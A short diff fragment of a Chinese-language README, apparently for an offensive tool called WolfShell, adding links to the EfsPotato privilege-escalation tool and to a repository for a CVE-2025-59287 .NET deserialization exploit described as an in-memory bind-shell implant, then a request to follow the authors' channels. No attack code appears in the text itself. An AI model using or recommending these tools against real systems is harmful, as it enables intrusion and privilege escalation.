+* EfsPotato(提权工具)：https://github.com/zcgonvh/EfsPotato
+* CVE-2025-59287漏洞 .net反序列化 内存正向马: https://github.com/0x7556/CVE-2025-59287
+
+## 关注
+
+* 欢迎大家关注公众号和Github，您的关注、点赞、反馈，将是软件更新的动力来源!
+  
+![WolfShell](join.png) ![WolfShell](join_group.jpg)
